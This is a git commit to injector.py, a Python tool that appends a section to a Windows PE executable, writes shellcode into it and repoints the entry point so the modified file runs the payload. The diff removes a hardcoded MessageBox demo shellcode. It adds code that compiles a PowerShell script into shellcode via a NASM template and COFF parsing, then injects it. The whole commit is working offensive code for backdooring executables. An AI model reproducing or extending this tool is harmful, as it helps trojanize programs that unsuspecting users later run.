62850bf3341775e96358c927f1c0d554c78feb8f
Black-Frost <vovantiendung2001@gmail.com>
2021-04-21 23:10:18 +0700

    Add some functions to generate shellcode based on my pre-defined template

--- injector.py
+++ injector.py
@@ -2,6 +2,8 @@
 
 import pefile
 import sys
+from os import system
+import struct
 
 def align(size, alignment):
     return (((size + alignment - 1) // alignment) * alignment)
@@ -51,39 +53,51 @@ def addSection(fileName, sectionSize, injectedFile):
     f.write(b"\x00" * rawSize)
     f.close()
 
-def getShellCode(scriptPath):
+def extractShellcode(filename):
+    '''A simple COFF parser to extract the shellcode from the COFF file'''
+    with open(filename, "rb") as f:
+        f.seek(16, 0)
+        optionalHeaderSize = struct.unpack("<l", f.read(4))[0]
+        f.seek(20 + optionalHeaderSize, 0)  #go to the section header
+
+        #we don't need to loop through the file to find the .text section
+        #because there is only 1 section
+
+        f.seek(16, 1)
+        shellcodeSize = struct.unpack("<l", f.read(4))[0]   #read the s_size field of the structure
+        shellcodeAddr = struct.unpack("<l", f.read(4))[0]   #read the s_scnptr field of the structure
+
+        f.seek(shellcodeAddr, 0)
+        shellcode = f.read(shellcodeSize)
+        return shellcode
+
+def craftShellcode(scriptPath):
+    '''write the ps script to an asm file and compile it to create shellcode'''
+
+    print("[*] Reading powershell script")
     script = ""
     with open(scriptPath, "r") as f:
-        script = f.read()
-    print(script)
+        script = f.read().strip('\n')
 
 
+    asmTemplate = '''mov eax, 1 
+                xor ecx, ecx
+                db \"%s\", 0'''
 
-def injectShellcode(fileName):
+    #compile the shellcode to a COFF file then extract it
+    print("[*] Compiling shellcode")
+    asmFile = open("shellFile.S", "w")
+    asmFile.write(asmTemplate %(script))
+    asmFile.close()
+    system("nasm -f win64 shellFile.S -o compiled.obj")
+    compiledCode = extractShellcode("compiled.obj")
+    system("del /f shellFile.S")
+    system("del /f compiled.obj")
+    return compiledCode
+
+def injectShellcode(fileName, shellcode):
     '''write shellcode to the newly created section, then change the entry point'''
     print("[*] Injecting shellcode")
-    shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
-                  b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
-                  b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
-                  b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
-                  b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
-                  b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
-                  b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
-                  b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
-                  b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
-                  b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
-                  b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
-                  b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
-                  b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
-                  b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
-                  b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
-                  b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x74\x79\x58\x68"
-                  b"\x65\x63\x75\x72\x68\x6b\x49\x6e\x53\x68\x42\x72\x65"
-                  b"\x61\x31\xdb\x88\x5c\x24\x0f\x89\xe3\x68\x65\x58\x20"
-                  b"\x20\x68\x20\x63\x6f\x64\x68\x6e\x20\x75\x72\x68\x27"
-                  b"\x6d\x20\x69\x68\x6f\x2c\x20\x49\x68\x48\x65\x6c\x6c"
-                  b"\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x6a\x40\x53"
-                  b"\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08")
 
     pe = pefile.PE(fileName)
     rawOffset = pe.sections[pe.FILE_HEADER.NumberOfSections - 1].PointerToRawData
@@ -105,7 +119,7 @@ if __name__ == "__main__":
     peFilePath = sys.argv[1]
     psScriptPath = sys.argv[2]
 
+    shellcode = craftShellcode(psScriptPath)
     outputFile = "modified.exe"
-    #addSection(peFilePath, 0x1000, outputFile)
-    #injectShellcode(outputFile)
-    getShellCode(psScriptPath)
+    addSection(peFilePath, len(shellcode), outputFile)
+    injectShellcode(outputFile, shellcode)
